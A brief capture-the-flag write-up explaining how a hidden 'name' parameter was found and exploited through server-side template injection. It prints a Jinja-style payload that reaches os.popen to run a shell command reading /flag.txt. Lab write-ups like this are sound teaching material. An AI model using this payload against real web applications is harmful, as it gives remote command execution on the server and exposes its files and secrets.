# solution

This challenge is bit guessing, from the title and this main page
![alt text](image.png)<br>
I guess maybe have a parameter **name** so i try and luckily this appear
![alt text](image-1.png)<br>
From my experience i think this is some kinds of ssti and like **I know your ip** i test this payload

```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}
```

![alt text](image-2.png)<br>
